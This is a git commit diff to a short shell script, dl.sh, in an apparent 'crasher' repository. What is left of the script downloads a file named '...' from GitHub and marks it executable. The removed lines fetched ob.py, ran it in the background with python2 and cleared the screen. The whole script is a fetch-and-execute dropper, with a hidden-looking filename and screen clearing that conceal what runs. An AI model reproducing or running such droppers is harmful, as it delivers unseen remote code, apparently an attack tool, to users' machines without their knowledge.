b7cbc1c493bf3f9006d7da51773dd470853b4dd2
trhacknon <98242014+trhacknon@users.noreply.github.com>
2022-06-03 02:31:46 +0200

    Update dl.sh

--- dl.sh
+++ dl.sh
@@ -1,6 +1,2 @@
 wget "https://raw.githubusercontent.com/trhacknon/crasher/WA/..."
 chmod +x ... 
-wget "https://raw.githubusercontent.com/trhacknon/crasher/WA/ob.py"
-chmod +x ob.py
-python2 ob.py &
-clear
